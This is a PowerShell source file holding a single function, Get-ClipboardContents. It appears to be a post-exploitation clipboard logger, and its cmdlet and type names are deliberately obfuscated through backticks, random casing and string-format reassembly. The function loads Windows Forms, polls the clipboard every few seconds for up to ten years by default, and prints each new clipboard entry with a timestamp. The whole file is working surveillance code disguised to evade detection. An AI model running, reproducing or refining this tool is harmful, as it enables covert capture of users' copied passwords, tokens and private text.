function G`et-clI`PboArd`CoNTEntS {


    [CmdletBinding()] Param (
        [Parameter(pOsitioN = 1)]
        [UInt32]
        ${coL`lE`c`TIoNLiM`IT},

        [Parameter(PoSitION = 2)]
        [UInt32]
        ${P`Oll`INTe`RvAL} = 15
    )

    .("{1}{2}{0}"-f'e','Add-','Typ') -AssemblyName ("{4}{5}{2}{3}{1}{0}"-f 'orms','F','ind','ows.','System','.W')

    
    if(${COlLeCT`ION`l`iMiT}) {
        ${S`ToPTi`Me} = (.("{1}{2}{0}" -f 'e','Get-Da','t')).("{1}{0}{3}{2}"-f'dd','a','tes','minu').Invoke(${COLLE`cTi`o`NliMIt})
    }
    else {
        ${Sto`P`TIMe} = (&("{1}{0}{2}"-f '-Da','Get','te')).("{2}{0}{1}" -f'dyear','s','ad').Invoke(10)
    }

    ${Ti`MesTA`Mp} = (.("{0}{1}" -f 'Get','-Date') -Format ("{6}{5}{4}{3}{0}{2}{1}"-f 'HH:',':ss:ff','mm',':','yyy','d/MM/y','d'))
    ('=='+'= '+'G'+'et'+'-Clip'+'boar'+'dConten'+'ts '+'S'+'tartin'+'g'+' '+'at'+' '+"$TimeStamp "+"===`n")

    
    ${PrEv`Le`NGtH} = 0
    ${p`REVF`I`RsT`chAr} = ""

    for(;;){
        if ((.("{2}{0}{1}"-f't-Da','te','Ge')) -lt ${stOpT`iME}){

            
            ${T`B} = &("{2}{0}{1}" -f 'bje','ct','New-O') ("{2}{5}{7}{1}{4}{6}{0}{3}{8}" -f 's','Wi','S','.T','nd','yste','ows.Form','m.','extBox')
            ${tb}."muLti`l`ine" = ${tR`Ue}
            ${tb}.("{0}{1}"-f 'P','aste').Invoke()

            
            if ((${tb}."t`Ext"."LEn`GtH" -ne 0) -and (${tB}."tE`xt"."l`EnG`Th" -ne ${PR`eVlEn`GtH})){
                
                
                
                if(${p`R`eVfir`stCh`Ar} -ne (${Tb}."tE`Xt")[0]){
                    ${tI`m`EstaMp} = (.("{2}{0}{1}"-f'D','ate','Get-') -Format ("{3}{1}{2}{0}{4}" -f 'm:ss:','HH',':m','dd/MM/yyyy:','ff'))
                    ("`n=== "+"$TimeStamp "+"===`n")
                    ${t`B}."te`XT"
                    ${PR`Evf`iRst`CHAr} = (${tB}."Te`xt")[0]
                    ${PR`eVleNG`Th} = ${t`B}."T`eXT"."len`GTh" 
                }
            }
        }
        else{
            ${t`imeSt`Amp} = (.("{2}{1}{0}" -f 'ate','et-D','G') -Format ("{3}{0}{2}{4}{1}" -f'HH:mm:','f','s','dd/MM/yyyy:','s:f'))
            ("`n=== "+'Get'+'-C'+'lipbo'+'ar'+'dC'+'onte'+'nts '+'Sh'+'ut'+'ting '+'down'+' '+'a'+'t '+"$TimeStamp "+"===`n")
            Break;
        }
        &("{3}{0}{1}{2}" -f'art','-','Sleep','St') -s ${P`oL`l`iNTER`VAL}
    }
}